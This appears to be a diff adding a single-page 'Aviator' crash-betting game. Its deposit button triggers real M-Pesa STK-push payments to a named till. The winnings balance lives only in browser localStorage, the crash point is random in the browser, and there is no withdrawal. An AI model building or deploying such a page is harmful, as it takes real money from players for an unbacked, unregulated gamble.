@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AVIATOR FLY ✈️</title>
+<style>
+body{background:#0f1420;color:#fff;font-family:Arial;display:flex;flex-direction:column;align-items:center;padding:10px}
+.header,.balance,.controls{width:100%;max-width:600px;border-radius:10px;padding:12px;margin-bottom:8px}
+.header{background:#1a2333;text-align:center;font-weight:bold;font-size:18px}
+.balance{background:#00c853;text-align:center;font-weight:bold}
+.controls{background:#1e2a3d;padding:15px;border-radius:12px}
+.plane{font-size:50px;text-align:center;animation:float 1.5s infinite alternate}
+@keyframes float{from{transform:translateY(0)}to{transform:translateY(-10px)}}
+.mult{font-size:48px;color:#ffeb3b;text-align:center;font-weight:bold}
+.input{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:none;font-size:16px}
+.bet-btn{width:100%;padding:14px;background:#00e676;font-weight:bold;border:none;border-radius:8px;font-size:18px}
+.deposit-btn{width:100%;padding:14px;background:#ffeb3b;font-weight:bold;border:none;border-radius:8px;margin-top:6px}
+.status{text-align:center;margin-top:10px;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="header">AVIATOR FLY ✈️</div>
+<div class="balance" id="balance">Balance: KES 0.00</div>
+<div class="controls">
+<div class="plane">✈️</div>
+<div class="mult" id="multiplier">1.00x</div>
+<input id="betAmount" class="input" type="number" value="50">
+<button class="bet-btn" id="betBtn" onclick="placeBet()">BET</button>
+<input id="phone" class="input" type="text" value="2547" placeholder="2547XXXXXXXX">
+<input id="depAmount" class="input" type="number" value="100">
+<button class="deposit-btn" onclick="deposit()">DEPOSIT - STK (Till 5259614)</button>
+<div class="status" id="status"></div>
+</div>
+<script>
+const RENDER_BACKEND = "https://aviator-fly-backend.onrender.com";
+let balance=parseFloat(localStorage.getItem('avi_bal')||'0');let bet=0;let isFlying=false;let curMult=1;let crashAt=0;let interval=null;
+function updateBal(){document.getElementById('balance').innerText='Balance: KES '+balance.toFixed(2);localStorage.setItem('avi_bal',balance);}updateBal();
+function placeBet(){let amt=parseFloat(document.getElementById('betAmount').value);if(amt>balance){document.getElementById('status').innerHTML='No balance - Deposit';return;}if(isFlying)return;bet=amt;balance-=amt;updateBal();isFlying=true;curMult=1;crashAt=Math.random()*9+1.1;document.getElementById('betBtn').innerText='CASHOUT';document.getElementById('betBtn').onclick=cashout;interval=setInterval(()=>{curMult+=0.05+curMult*0.01;document.getElementById('multiplier').innerText=curMult.toFixed(2)+'x';if(curMult>=crashAt)crash();},100);}
+function cashout(){if(!isFlying)return;clearInterval(interval);let win=bet*curMult;balance+=win;updateBal();document.getElementById('status').innerHTML='WON '+win.toFixed(2);resetGame();}
+function crash(){clearInterval(interval);document.getElementById('status').innerHTML='CRASHED @ '+crashAt.toFixed(2)+'x';resetGame();}
+function resetGame(){isFlying=false;document.getElementById('betBtn').innerText='BET';document.getElementById('betBtn').onclick=placeBet;}
+async function deposit(){const phone=document.getElementById('phone').value.trim();const amount=document.getElementById('depAmount').value.trim();const s=document.getElementById('status');s.innerHTML='Sending STK to Till 5259614...';let urls=[RENDER_BACKEND+'/stk','/stk.php','stk.php'];for(let url of urls){try{let res=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,amount})});let data=await res.json();if(data.ResponseCode=='0'){s.innerHTML='STK Sent! Check phone';setTimeout(()=>{balance+=parseFloat(amount);updateBal();},4000);return;} }catch(e){continue;}}s.innerHTML='TOKEN FAILED - Deploy Render backend first';}
+</script>
+</body>
+</html>
